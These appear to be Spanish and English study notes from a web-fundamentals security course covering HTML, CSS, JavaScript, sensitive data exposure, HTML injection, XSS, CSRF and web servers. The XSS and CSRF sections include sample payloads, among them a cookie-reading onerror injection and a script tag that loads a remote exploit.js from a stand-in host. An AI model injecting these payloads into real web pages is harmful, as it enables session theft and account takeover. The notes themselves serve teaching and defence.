|`6.`|Creating Weak Passwords|
|`7.`|Storing Unencrypted Data in the Database|
|`8.`|Depending Excessively on the Client Side|
|`9.`|Being Too Optimistic|
|`10.`|Permitting Variables via the URL Path Name|
|`11.`|Trusting third-party code|
|`12.`|Hard-coding backdoor accounts|
|`13.`|Unverified SQL injections|
|`14.`|Remote file inclusions|
|`15.`|Insecure data handling|
|`16.`|Failing to encrypt data properly|
|`17.`|Not using a secure cryptographic system|
|`18.`|Ignoring layer 8|
|`19.`|Review user actions|
|`20.`|Web Application Firewall misconfigurations|

Estos errores conducen a las [OWASP Top 10](https://owasp.org/www-project-top-ten/) vulnerabilidades para aplicaciones web, que discutiremos en otros módulos:

|**No.**|**Vulnerability**|
|---|---|
|`1.`|Broken Access Control|
|`2.`|Cryptographic Failures|
|`3.`|Injection|
|`4.`|Insecure Design|
|`5.`|Security Misconfiguration|
|`6.`|Vulnerable and Outdated Components|
|`7.`|Identification and Authentication Failures|
|`8.`|Software and Data Integrity Failures|
|`9.`|Security Logging and Monitoring Failures|
|`10.`|Server-Side Request Forgery (SSRF)|

Es importante empezar a familiarizarnos con estos fallos y vulnerabilidades, ya que forman la base de muchos de los temas que cubriremos en futuros módulos relacionados con la web e incluso no relacionados con la web. Como pentesters, debemos tener la capacidad de identificar, explotar y explicar de forma competente estas vulnerabilidades para nuestros clientes.


# HTML

---

El primer y más dominante componente del front-end de las aplicaciones web es [HTML (HyperText Markup Language)](https://en.wikipedia.org/wiki/HTML). HTML es el núcleo de cualquier página web que veamos en Internet. Contiene los elementos básicos de cada página, como títulos, formularios, imágenes y muchos otros elementos. El navegador, por su parte, interpreta estos elementos y los muestra al usuario final.

A continuación se muestra un ejemplo muy básico de una página HTML:

#### Example

Code: html

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1>A Heading</h1>
        <p>A Paragraph</p>
    </body>
</html>
```

This would display the following: ![HTML Example](https://academy.hackthebox.com/storage/modules/75/web_apps_html_2.jpg)

Como podemos ver, los elementos HTML se muestran en forma de árbol, de forma similar a `XML` y otros lenguajes:

#### HTML Structure

  HTML

```shell-session
document
 - html
   -- head
      --- title
   -- body
      --- h1
      --- p
```

Cada elemento puede contener otros elementos HTML, mientras que la etiqueta principal `HTML` debe contener todos los demás elementos de la página, que entra dentro de `document`, distinguiendo entre `HTML` y documentos escritos para otros lenguajes, como los documentos `XML`.

Los elementos HTML del código anterior pueden verse como sigue:

<html>

    <head>

<title>Page Title</title>

    </head>

    <body>

<h1>A Heading</h1>

<p>A Paragraph</p>

    </body>

</html>

  

Cada elemento HTML se abre y se cierra con una etiqueta que especifica el tipo del elemento «por ejemplo, `<p>` para párrafos», donde el contenido se colocaría entre estas etiquetas. Las etiquetas también pueden contener el id o la clase del elemento «por ejemplo, `<p id=“para1”>` o `<p id=“red-paragraphs”>`», necesarios para que CSS formatee correctamente el elemento. Tanto las etiquetas como el contenido forman el elemento completo.

---

## URL Encoding

Un concepto importante que hay que aprender en HTML es [URL Encoding](https://en.wikipedia.org/wiki/Percent-encoding), o codificación porcentual. Para que un navegador muestre correctamente el contenido de una página, debe conocer el conjunto de caracteres utilizado. En las URL, por ejemplo, los navegadores sólo pueden utilizar la codificación [ASCII](https://en.wikipedia.org/wiki/ASCII), que sólo permite caracteres alfanuméricos y ciertos caracteres especiales. Por lo tanto, todos los demás caracteres fuera del conjunto de caracteres ASCII tienen que codificarse dentro de una URL. La codificación URL sustituye los caracteres ASCII no seguros por un símbolo `%` seguido de dos dígitos hexadecimales.

Por ejemplo, el carácter de comilla simple '`'`' se codifica como '`%27`', que los navegadores pueden entender como una comilla simple. Las URL no pueden contener espacios, y éstos se sustituyen por un signo `+` (más) o `%20`. Algunas codificaciones de caracteres comunes son:

|Character|Encoding|
|---|---|
|space|%20|
|!|%21|
|"|%22|
|#|%23|
|$|%24|
|%|%25|
|&|%26|
|'|%27|
|(|%28|
|)|%29|

Puede consultar una tabla completa de codificación de caracteres [aquí](https://www.w3schools.com/tags/ref_urlencode.ASP).

Se pueden utilizar muchas herramientas en línea para realizar la codificación/descodificación de URL. Además, el popular proxy web [Burp Suite](https://portswigger.net/burp) tiene un decodificador/decodificador que puede utilizarse para convertir entre varios tipos de codificaciones. Pruebe a codificar/decodificar algunos caracteres y cadenas utilizando esta [herramienta en línea](https://www.url-encode-decode.com/).

#### Usage

El elemento `<head>` suele contener elementos que no se imprimen directamente en la página, como el título de la página, mientras que todos los elementos principales de la página se encuentran en `<body>`. Otros elementos importantes son el `<style>`, que contiene el código CSS de la página, y el `<script>`, que contiene el código JS de la página, como veremos en la siguiente sección.

Cada uno de estos elementos se denomina [DOM (Document Object Model)](https://en.wikipedia.org/wiki/Document_Object_Model). El [World Wide Web Consortium (W3C)](https://www.w3.org/) define `DOM` como:

`«El Modelo de Objetos de Documento (DOM) del W3C es una plataforma e interfaz de lenguaje neutral que permite a los programas y scripts acceder dinámicamente y actualizar el contenido, estructura y estilo de un documento».

El estándar DOM se divide en tres partes

- `Core DOM` - el modelo estándar para todos los tipos de documentos
- XML DOM: el modelo estándar para documentos XML.
- HTML DOM` - el modelo estándar para documentos HTML

Por ejemplo, desde la vista de árbol anterior, podemos referirnos a los DOM como `document.head` o `document.h1`, etc.

Comprender la estructura DOM de HTML puede ayudarnos a entender dónde se encuentra cada elemento que vemos en la página, lo que nos permite ver el código fuente de un elemento específico de la página y buscar posibles problemas. Podemos localizar elementos HTML por su id, su nombre de etiqueta o su nombre de clase.

Esto también es útil cuando queremos utilizar vulnerabilidades de front-end (como `XSS`) para manipular elementos existentes o crear nuevos elementos para satisfacer nuestras necesidades.

# AQUI
# Cascading Style Sheets (CSS)

---

[CSS (Cascading Style Sheets)](https://www.w3.org/Style/CSS/Overview.en.html) is the stylesheet language used alongside HTML to format and set the style of HTML elements. Like HTML, there are several versions of CSS, and each subsequent version introduces a new set of capabilities that can be used for formatting HTML elements. Browsers are updated alongside it to support these new features.

---

#### Example

At a fundamental level, CSS is used to define the style of each class or type of HTML elements (i.e., `body` or `h1`), such that any element within that page would be represented as defined in the CSS file. This could include the font family, font size, background color, text color and alignment, and more.

Code: css

```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}
```

As previously mentioned, this is why we may set unique IDs or class names for certain HTML elements so that we can later refer to them within CSS or JavaScript when needed.

---

## Syntax

CSS defines the style of each HTML element or class between curly brackets `{}`, within which the properties are defined with their values (i.e. `element { property : value; }`).

Each HTML element has many properties that can be set through CSS, such as `height`, `position`, `border`, `margin`, `padding`, `color`, `text-align`, `font-size`, and hundreds of other properties. All of these can be combined and used to design visually appealing web pages.

CSS can be used for advanced animations for a wide variety of uses, from moving items all the way to advanced 3D animations. Many CSS properties are available for animations, like `@keyframes`, `animation`, `animation-duration`, `animation-direction`, and many others. You can read about and try out many of these animation properties [here](https://www.w3schools.com/css/css3_animations.asp).

---

#### Usage

CSS is often used alongside JavaScript to make quick calculations, dynamically adjust the style properties of certain HTML elements, or achieve advanced animations based on keystrokes or the mouse cursor location.

The following example beautifully illustrates such capabilities of CSS when used with HTML and JavaScript "Parallax Depth Cards - by Andy Merskin on [CodePen](https://codepen.io/)":

You can click on the tabs on the top-left to view the source code.

This shows that even though HTML and CSS are among the most basic cornerstones of web development when used properly, they can be used to build visually stunning web pages, which can make interacting with web applications a much easier and more user-friendly experience.

Furthermore, CSS can be used alongside other languages to implement their styles, like `XML` or within `SVG` items, and can also be used in modern mobile development platforms to design entire mobile application User Interfaces (UI).

---

## Frameworks

Many may consider CSS to be difficult to develop. In contrast, others may argue that it is inefficient to manually set the style and design of all HTML elements in each web page. This is why many CSS frameworks have been introduced, which contain a collection of CSS style-sheets and designs, to make it much faster and easier to create beautiful HTML elements.

Furthermore, these frameworks are optimized for web application usage. They are designed to be used with JavaScript and for wide use within a web application and contain elements usually required within modern web applications. Some of the most common CSS frameworks are:

- [Bootstrap](https://www.w3schools.com/bootstrap4/)
- [SASS](https://sass-lang.com/)
- [Foundation](https://en.wikipedia.org/wiki/Foundation_(framework))
- [Bulma](https://bulma.io/)
- [Pure](https://purecss.io/)


# JavaScript

---

[JavaScript](https://en.wikipedia.org/wiki/JavaScript) is one of the most used languages in the world. It is mostly used for web development and mobile development. `JavaScript` is usually used on the front end of an application to be executed within a browser. Still, there are implementations of back end JavaScript used to develop entire web applications, like [NodeJS](https://nodejs.org/en/about/).

While `HTML` and `CSS` are mainly in charge of how a web page looks, `JavaScript` is usually used to control any functionality that the front end web page requires. Without `JavaScript`, a web page would be mostly static and would not have much functionality or interactive elements.

---

#### Example

Within the page source code, `JavaScript` code is loaded with the `<script>` tag, as follows:

Code: html

```html
<script type="text/javascript">
..JavaScript code..
</script>
```

A web page can also load remote `JavaScript` code with `src` and the script's link, as follows:

Code: html

```html
<script src="./script.js"></script>
```

An example of basic use of `JavaScript` within a web page is the following:

Code: javascript

```javascript
document.getElementById("button1").innerHTML = "Changed Text!";
```

The above example changes the content of the `button1` HTML element. From here on, there are many more advanced uses of `JavaScript` on a web page. The following shows an example of what the above `JavaScript` code would do when linked to a button click:

Original Text

As with HTML, there are many sites available online to experiment with `JavaScript`. One example is [JSFiddle](https://jsfiddle.net/) which can be used to test `JavaScript`, `CSS`, and `HTML` and save code snippets. `JavaScript` is an advanced language, and its syntax is not as simple as `HTML` or `CSS`.

---

## Usage

Most common web applications heavily rely on `JavaScript` to drive all needed functionality on the web page, like updating the web page view in real-time, dynamically updating content in real-time, accepting and processing user input, and many other potential functionalities.

`JavaScript` is also used to automate complex processes and perform HTTP requests to interact with the back end components and send and retrieve data, through technologies like [Ajax](https://en.wikipedia.org/wiki/Ajax_(programming)).

In addition to automation, `JavaScript` is also often used alongside `CSS`, as previously mentioned, to drive advanced animations that would not be possible with `CSS` alone. Whenever we visit an interactive and dynamic web page that uses many advanced and visually appealing animations, we are seeing the result of active `JavaScript` code running on our browser.

All modern web browsers are equipped with `JavaScript` engines that can execute `JavaScript` code on the client-side without relying on the back end webserver to update the page. This makes using `JavaScript` a very fast way to achieve a large number of processes quickly.

---

## Frameworks

As web applications become more advanced, it may be inefficient to use pure `JavaScript` to develop an entire web application from scratch. This is why a host of `JavaScript` frameworks have been introduced to improve the experience of web application development.

These platforms introduce libraries that make it very simple to re-create advanced functionalities, like user login and user registration, and they introduce new technologies based on existing ones, like the use of dynamically changing `HTML` code, instead of using static `HTML` code.

These platforms either use `JavaScript` as their programming language or use an implementation of `JavaScript` that compiles its code into `JavaScript` code.

Some of the most common front end `JavaScript` frameworks are:

- [Angular](https://www.w3schools.com/angular/angular_intro.asp)
- [React](https://www.w3schools.com/react/react_intro.asp)
- [Vue](https://www.w3schools.com/whatis/whatis_vue.asp)
- [jQuery](https://www.w3schools.com/jquery/)

A listing and comparison of common JavaScript frameworks can be found [here](https://en.wikipedia.org/wiki/Comparison_of_JavaScript_frameworks).


# Sensitive Data Exposure

---

Todo el `front end` los componentes que cubrimos interactúan con el lado del cliente. Por lo tanto, si son atacados, no representan una amenaza directa para el núcleo `back end` de la aplicación web y por lo general no dará lugar a daños permanentes. Sin embargo, como estos componentes se ejecutan en el `client-side`'', ponen al usuario final en peligro de ser atacado y explotado si tienen alguna vulnerabilidad. Si se aprovecha una vulnerabilidad frontal para atacar a los usuarios administradores, podría resultar en acceso no autorizado, acceso a datos confidenciales, interrupción del servicio y más.

Aunque la mayoría de las pruebas de penetración de aplicaciones web se centran en los componentes de back-end y su funcionalidad, también es importante probar los componentes front-end en busca de posibles vulnerabilidades, ya que este tipo de vulnerabilidades a veces se pueden utilizar para obtener acceso a funcionalidades confidenciales (es decir, un panel de administración), lo que puede llevar a comprometer todo el servidor.

[Exposición Sensible a Datos](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) se refiere a la disponibilidad de datos confidenciales en texto claro para el usuario final. Esto se encuentra generalmente en el `source code` de la página web o fuente de la página en la parte frontal de las aplicaciones web. Este es el código fuente HTML de la aplicación, que no debe confundirse con el código de back-end que normalmente solo es accesible en el servidor. Podemos ver la fuente de la página de cualquier sitio web en nuestro navegador haciendo clic derecho en cualquier lugar de la página y seleccionando `View Page Source` desde el menú emergente. A veces, un desarrollador puede deshabilitar el clic derecho en una aplicación web, pero esto no nos impide ver el origen de la página, ya que simplemente podemos escribir `ctrl + u` o vea la fuente de la página a través de un proxy web como `Burp Suite`. Echemos un vistazo a la fuente de la página google.com. Haga clic derecho y elija `View Page Source`, y una nueva pestaña se abrirá en nuestro navegador con la URL `view-source:https://www.google.com/`. Aquí podemos ver el `HTML`, `JavaScript`, y enlaces externos. Tómese un momento para navegar un poco por la fuente de la página.

   

![](https://academy.hackthebox.com/storage/modules/75/view_source1.png)

A veces podemos encontrar el inicio de sesión `credentials`, `hashes`u otros datos confidenciales ocultos en los comentarios del código fuente de una página web o dentro de datos externos `JavaScript` código que se importa. Otra información confidencial puede incluir enlaces o directorios expuestos o incluso información de usuario expuesta, todo lo cual puede aprovecharse para ampliar nuestro acceso dentro de la aplicación web o incluso la infraestructura de soporte de la aplicación web (servidor web, servidor de base de datos, etc.).

Por esta razón, una de las primeras cosas que debemos hacer al evaluar una aplicación web es revisar el código fuente de su página para ver si podemos identificar cualquier 'fruta de bajo rendimiento', como credenciales expuestas o enlaces ocultos.

---

#### Ejemplo

A primera vista, este formulario de inicio de sesión no parece nada fuera de lo común:

![Ejemplo HTML](https://academy.hackthebox.com/storage/modules/75/web_apps_login_form_.png)

Echemos un vistazo a la fuente de la página:

Código: html

```html
<form action="action_page.php" method="post">

    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <!-- TODO: remove test credentials test:test -->

        <button type="submit">Login</button>
    </div>
</form>

</html>
```

Vemos que los desarrolladores agregaron algunos comentarios que olvidaron eliminar, que contienen credenciales de prueba:

Código: html

```html
<!-- TODO: remove test credentials test:test -->
```

El comentario parece ser un recordatorio para que los desarrolladores eliminen las credenciales de prueba. Dado que el comentario aún no se ha eliminado, estas credenciales aún pueden ser válidas.

Aunque no es muy común encontrar credenciales de inicio de sesión en los comentarios de los desarrolladores, todavía podemos encontrar varios bits de información sensible y valiosa al mirar el código fuente, como páginas de prueba o directorios, parámetros de depuración u funcionalidad oculta. Existen varias herramientas automatizadas que podemos usar para escanear y analizar el código fuente de la página disponible para identificar posibles rutas o directorios y otra información confidencial.

Aprovechar este tipo de información puede darnos más acceso a la aplicación web, lo que puede ayudarnos a atacar los componentes del back-end para obtener control sobre el servidor.

---

## Prevención

Idealmente, el código fuente frontal solo debe contener el código necesario para ejecutar todas las funciones de las aplicaciones web, sin ningún código adicional o comentarios que no sean necesarios para que la aplicación web funcione correctamente. Siempre es importante revisar el código que será visible para los usuarios finales a través de la fuente de la página o ejecutarlo a través de herramientas para verificar la información expuesta.

También es importante clasificar los tipos de datos dentro del código fuente y aplicar controles sobre lo que puede o no puede exponerse en el lado del cliente. Los desarrolladores también deben revisar el código del lado del cliente para asegurarse de que no se dejen comentarios innecesarios ni enlaces ocultos. Además, los desarrolladores front-end pueden querer usar `JavaScript` embalaje de código u ofuscación para reducir las posibilidades de exponer datos confidenciales a través de `JavaScript code`. Estas técnicas pueden evitar que las herramientas automatizadas localizan este tipo de datos.

# HTML Injection

---

Otro aspecto importante de la seguridad frontal es validar y desinfectar la entrada de usuario aceptada. En muchos casos, la validación y desinfección de la entrada del usuario se lleva a cabo en el extremo posterior. Sin embargo, alguna entrada del usuario nunca llegaría al back-end en algunos casos y se procesa y renderiza completamente en el front-end. Por lo tanto, es fundamental validar y desinfectar la entrada del usuario tanto en el extremo frontal como en el extremo posterior.

[Inyección HTML](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection) ocurre cuando se muestra la entrada de usuario sin filtrar en la página. Esto puede ser a través de la recuperación de código enviado previamente, como recuperar un comentario de usuario de la base de datos de back-end, o mostrando directamente la entrada de usuario sin filtrar a través de `JavaScript` en la parte delantera.

Cuando un usuario tiene el control completo de cómo se mostrará su entrada, puede enviar `HTML` código, y el navegador puede mostrarlo como parte de la página. Esto puede incluir un malicioso `HTML` código, como un formulario de inicio de sesión externo, que se puede usar para engañar a los usuarios para que inicien sesión mientras envían sus credenciales de inicio de sesión a un servidor malicioso para que se recopilen para otros ataques.

Otro ejemplo de `HTML Injection` es desfiguración de la página web. Esto consiste en inyectar nuevo `HTML` código para cambiar la apariencia de la página web, insertar anuncios maliciosos o incluso cambiar completamente la página. Este tipo de ataque puede provocar graves daños a la reputación de la empresa que aloja la aplicación web.

---

#### Ejemplo

El siguiente ejemplo es una página web muy básica con un solo botón "`Click to enter your name`." Cuando hacemos clic en el botón, nos pide que introduzcamos nuestro nombre y luego muestra nuestro nombre como "`Your name is ...`":

![Ejemplo HTML](https://academy.hackthebox.com/storage/modules/75/web_apps_html_injection_5.jpg)

Si no hay desinfección de entrada, este es potencialmente un objetivo fácil para `HTML Injection` y `Cross-Site Scripting (XSS)` ataques. Echamos un vistazo al código fuente de la página y no vemos ninguna desinfección de entrada en su lugar, ya que la página toma la entrada del usuario y la muestra directamente:

Código: html

```html
<!DOCTYPE html>
<html>

<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");

            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>

</html>
```

Para probar `HTML Injection`, podemos simplemente introducir un pequeño fragmento de `HTML` código como nuestro nombre, y ver si se muestra como parte de la página. Probaremos el siguiente código, que cambia la imagen de fondo de la página web:

Código: html

```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

Una vez que lo ingresamos, vemos que la imagen de fondo de la página web cambia instantáneamente:

![Ejemplo HTML](https://academy.hackthebox.com/storage/modules/75/web_apps_html_injection_6.jpg)

En este ejemplo, como todo se está llevando a cabo en la parte frontal, actualizar la página web restablecería todo a la normalidad.


# Cross-Site Scripting (XSS)

---

`HTML Injection` las vulnerabilidades a menudo se pueden utilizar para también realizar [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) ataques inyectando `JavaScript` código a ejecutar en el lado del cliente. Una vez que podemos ejecutar código en la máquina de la víctima, podemos obtener acceso a la cuenta de la víctima o incluso a su máquina. `XSS` es muy similar a `HTML Injection` en la práctica. Sin embargo, `XSS` implica la inyección de `JavaScript` código para realizar ataques más avanzados en el lado del cliente, en lugar de simplemente inyectar código HTML. Hay tres tipos principales de `XSS`:

|Tipo|Descripción|
|---|---|
|`Reflected XSS`|Ocurre cuando la entrada del usuario se muestra en la página después del procesamiento (por ejemplo, resultado de búsqueda o mensaje de error).|
|`Stored XSS`|Ocurre cuando la entrada del usuario se almacena en la base de datos de back-end y luego se muestra al recuperarla (por ejemplo, publicaciones o comentarios).|
|`DOM XSS`|Ocurre cuando la entrada del usuario se muestra directamente en el navegador y se escribe en un `HTML` Objeto DOM (por ejemplo, nombre de usuario vulnerable o título de página).|

En el ejemplo que vimos para `HTML Injection`, no hubo ninguna desinfección de entrada en absoluto. Por lo tanto, puede ser posible que la misma página sea vulnerable a `XSS` ataques. Podemos intentar inyectar lo siguiente `DOM XSS` `JavaScript` código como carga útil, que debe mostrarnos el valor de la cookie para el usuario actual:

Código: javascript

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

Una vez que ingresamos nuestra carga útil y golpeamos `ok`, vemos que aparece una ventana de alerta con el valor de la cookie:

![Ejemplo HTML](https://academy.hackthebox.com/storage/modules/75/web_apps_xss_2.jpg)

Esta carga útil está accediendo al `HTML` árbol de documentos y recuperar el `cookie` valor del objeto. Cuando el navegador procesa nuestra entrada, se considerará nuevo `DOM`, y nuestro `JavaScript` se ejecutará, mostrándonos el valor de la cookie en una ventana emergente.

Un atacante puede aprovechar esto para robar sesiones de cookies y enviárselas a sí mismo e intentar usar el valor de la cookie para autenticarse en la cuenta de la víctima. El mismo ataque se puede utilizar para realizar varios tipos de otros ataques contra los usuarios de una aplicación web. `XSS` es un tema vasto que se cubrirá en profundidad en módulos posteriores.


# Cross-Site Request Forgery (CSRF)

---

El tercer tipo de vulnerabilidad de front-end que es causada por la entrada de usuario sin filtrar es [Falsificación de Solicitud en Sitios Cruzados (CSRF)](https://owasp.org/www-community/attacks/csrf). `CSRF` los ataques pueden utilizar `XSS` vulnerabilidades para realizar ciertas consultas, y `API` llamadas a una aplicación web a la que la víctima está autenticada actualmente. Esto permitiría al atacante realizar acciones como usuario autenticado. También puede utilizar otras vulnerabilidades para realizar las mismas funciones, como utilizar parámetros HTTP para ataques.

Un común `CSRF` ataque para obtener un mayor acceso privilegiado a una aplicación web es crear un `JavaScript` carga útil que cambia automáticamente la contraseña de la víctima al valor establecido por el atacante. Una vez que la víctima ve la carga útil en la página vulnerable (por ejemplo, un comentario malicioso que contiene el `JavaScript` `CSRF` carga útil), el `JavaScript` el código se ejecutaría automáticamente. Usaría la sesión de inicio de sesión de la víctima para cambiar su contraseña. Una vez hecho esto, el atacante puede iniciar sesión en la cuenta de la víctima y controlarla.

`CSRF` también se puede aprovechar para atacar a los administradores y obtener acceso a sus cuentas. Los administradores generalmente tienen acceso a funciones sensibles, que a veces se pueden usar para atacar y obtener control sobre el servidor de back-end (dependiendo de la funcionalidad proporcionada a los administradores dentro de una aplicación web determinada). Siguiendo este ejemplo, en lugar de usar `JavaScript` código que devolvería la cookie de sesión, cargaríamos un control remoto `.js` (`JavaScript`) archivo, de la siguiente manera:

Código: html

```html
"><script src=//www.example.com/exploit.js></script>
```

El `exploit.js` el archivo contendría lo malicioso `JavaScript` código que cambia la contraseña del usuario. Desarrollando el `exploit.js` en este caso requiere el conocimiento del procedimiento de cambio de contraseña de esta aplicación web y `APIs`. El atacante tendría que crear `JavaScript` código que replicaría la funcionalidad deseada y la llevaría a cabo automáticamente (es decir `JavaScript` código que cambia nuestra contraseña para esta aplicación web específica).

---

## Prevención

Aunque debe haber medidas en el back-end para detectar y filtrar la entrada del usuario, también es siempre importante filtrar y desinfectar la entrada del usuario en el front-end antes de que llegue al back-end, y especialmente si este código puede mostrarse directamente en el lado del cliente sin comunicarse con el back-end. Se deben aplicar dos controles principales al aceptar la entrada del usuario:

|Tipo|Descripción|
|---|---|
|`Sanitization`|Eliminar caracteres especiales y caracteres no estándar de la entrada del usuario antes de mostrarlo o almacenarlo.|
|`Validation`|Asegurar que la entrada de usuario enviada coincida con el formato esperado (es decir, el formato de correo electrónico enviado coincidente)|

Además, también es importante desinfectar la salida mostrada y borrar cualquier carácter especial/no estándar. En caso de que un atacante logre eludir los filtros de desinfección y validación del extremo frontal y posterior, aún no causará ningún daño en el extremo frontal.

Una vez que desinfectamos y/o validamos la entrada del usuario y la salida mostrada, deberíamos poder prevenir ataques como `HTML Injection`, `XSS`, o `CSRF`. Otra solución sería implementar un [firewall de aplicaciones web (WAF)](https://en.wikipedia.org/wiki/Web_application_firewall), que debería ayudar a prevenir los intentos de inyección automáticamente. Sin embargo, debe tenerse en cuenta que las soluciones WAF pueden ser potencialmente omitidas, por lo que los desarrolladores deben seguir las mejores prácticas de codificación y no simplemente confiar en un dispositivo para detectar/bloquear ataques.

En cuanto a `CSRF`, muchos navegadores modernos tienen medidas anti-CSRF incorporadas, que impiden la ejecución automática `JavaScript` código. Además, muchas aplicaciones web modernas tienen medidas anti-CSRF, incluyendo ciertos encabezados HTTP y banderas que pueden prevenir solicitudes automatizadas (es decir, `anti-CSRF` token, o `http-only`/`X-XSS-Protection`). Ciertas otras medidas se pueden tomar desde un nivel funcional, como requerir que el usuario ingrese su contraseña antes de cambiarla. Muchas de estas medidas de seguridad se pueden eludir, y por lo tanto este tipo de vulnerabilidades aún pueden representar una gran amenaza para los usuarios de una aplicación web. Esta es la razón por la cual estas precauciones solo deben confiarse como una medida secundaria, y los desarrolladores siempre deben asegurarse de que su código no sea vulnerable a ninguno de estos ataques.

This [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) from OWASP discusses the attack and prevention measures in greater detail.


# Back End Servers

---

Un servidor de back-end es el hardware y el sistema operativo en el back-end que aloja todas las aplicaciones necesarias para ejecutar la aplicación web. Es el sistema real que ejecuta todos los procesos y lleva a cabo todas las tareas que componen toda la aplicación web. El servidor de back-end cabría en el [Capa de acceso a datos](https://en.wikipedia.org/wiki/Data_access_layer).

---

## Software

El servidor de back-end contiene los otros 3 componentes de back-end:

- `Web Server`
- `Database`
- `Development Framework`

![backend-servidor](https://academy.hackthebox.com/storage/modules/75/backend-server.jpg)

Otros componentes de software en el servidor de back-end pueden incluir [hipervisores](https://en.wikipedia.org/wiki/Hypervisor), contenedores y WAF.

Hay muchas combinaciones populares de "pilas" para servidores de back-end, que contienen un conjunto específico de componentes de back-end. Algunos ejemplos comunes incluyen:

|Combinaciones|Componentes|
|---|---|
|[LÁMPARA](https://en.wikipedia.org/wiki/LAMP_(software_bundle))|`Linux`, `Apache`, `MySQL`, y `PHP`.|
|[WAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)#WAMP)|`Windows`, `Apache`, `MySQL`, y `PHP`.|
|[VICTORIAS](https://en.wikipedia.org/wiki/Solution_stack)|`Windows`, `IIS`, `.NET`, y `SQL Server`|
|[MAMP](https://en.wikipedia.org/wiki/MAMP)|`macOS`, `Apache`, `MySQL`, y `PHP`.|
|[XAMPP](https://en.wikipedia.org/wiki/XAMPP)|Multiplataforma, `Apache`, `MySQL`, y `PHP/PERL`.|

Podemos encontrar una lista completa de Pilas de Soluciones Web en esto [artículo](https://en.wikipedia.org/wiki/Solution_stack).

---

## Hardware

El servidor de back-end contiene todo el hardware necesario. Las capacidades de potencia y rendimiento de este hardware determinan qué tan estable y receptiva será la aplicación web. Como se discutió anteriormente en el `Architecture` sección, muchas arquitecturas, especialmente para aplicaciones web enormes, están diseñadas para distribuir su carga en muchos servidores back-end que trabajan juntos colectivamente para realizar las mismas tareas y entregar la aplicación web al usuario final. Las aplicaciones web no tienen que ejecutarse directamente en un único servidor de back-end, pero pueden utilizar centros de datos y servicios de alojamiento en la nube que proporcionan hosts virtuales para la aplicación web.

# Web Servers

---

[Servidor web](https://en.wikipedia.org/wiki/Web_server) es una aplicación que se ejecuta en el servidor back-end, que maneja todo el tráfico HTTP desde el navegador del lado del cliente, lo enruta a las páginas solicitadas y finalmente responde al navegador del lado del cliente. Los servidores web generalmente se ejecutan en TCP [puertos](https://en.wikipedia.org/wiki/Port_(computer_networking)) `80` o `443`y son responsables de conectar a los usuarios finales a varias partes de la aplicación web, además de manejar sus diversas respuestas.

---

## Flujo de trabajo

Un servidor web típico acepta solicitudes HTTP del lado del cliente y responde con diferentes respuestas y códigos HTTP, como un código `200 OK` respuesta para una solicitud exitosa, un código `404 NOT FOUND` al solicitar páginas que no existen, código `403 FORBIDDEN` para solicitar acceso a páginas restringidas, etc.

![servidor web](https://academy.hackthebox.com/storage/modules/75/web-server-requests.jpg)

Los siguientes son algunos de los más comunes [Códigos de respuesta HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status):

|Código|Descripción|
|---|---|
|**Respuestas exitosas**||
|`200 OK`|La solicitud ha tenido éxito|
|**Mensajes de redirección**||
|`301 Moved Permanently`|La URL del recurso solicitado se ha cambiado permanentemente|
|`302 Found`|La URL del recurso solicitado se ha cambiado temporalmente|
|**Respuestas de error del cliente**||
|`400 Bad Request`|El servidor no pudo entender la solicitud debido a una sintaxis no válida|
|`401 Unauthorized`|Intento no autenticado de acceder a la página|
|`403 Forbidden`|El cliente no tiene derechos de acceso al contenido|
|`404 Not Found`|El servidor no puede encontrar el recurso solicitado|
|`405 Method Not Allowed`|El método de solicitud es conocido por el servidor, pero ha sido deshabilitado y no se puede utilizar|
|`408 Request Timeout`|Esta respuesta es enviada en una conexión inactiva por algunos servidores, incluso sin ninguna solicitud previa del cliente|
|**Respuestas de error del servidor**||
|`500 Internal Server Error`|El servidor ha encontrado una situación que no sabe cómo manejar|
|`502 Bad Gateway`|El servidor, mientras trabajaba como puerta de enlace para obtener una respuesta necesaria para manejar la solicitud, recibió una respuesta no válida|
|`504 Gateway Timeout`|El servidor está actuando como una puerta de enlace y no puede obtener una respuesta a tiempo|

Los servidores web también aceptan varios tipos de entrada de usuario dentro de las solicitudes HTTP, incluido el texto [JSON](https://www.w3schools.com/js/js_json_intro.asp), e incluso datos binarios (es decir, para cargas de archivos). Una vez que un servidor web recibe una solicitud web, es responsable de enrutarla a su destino, ejecutar cualquier proceso necesario para esa solicitud y devolver la respuesta al usuario en el lado del cliente. Las páginas y archivos a los que el servidor web procesa y enruta el tráfico son los archivos centrales de la aplicación web.

A continuación se muestra un ejemplo de solicitar una página en un terminal Linux utilizando el [CURL](https://en.wikipedia.org/wiki/CURL) utilidad y recepción de la respuesta del servidor mientras se utiliza el `-I` bandera, que muestra los encabezados:

  Servidores Web

```shell-session
vcrdcr@htb[/htb]$ curl -I https://academy.hackthebox.com

HTTP/2 200
date: Tue, 15 Dec 2020 19:54:29 GMT
content-type: text/html; charset=UTF-8
...SNIP...
```

Mientras esto `cURL` ejemplo de comando nos muestra el código fuente de la página web:

  Servidores Web

```shell-session
vcrdcr@htb[/htb]$ curl https://academy.hackthebox.com

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Cyber Security Training : HTB Academy</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

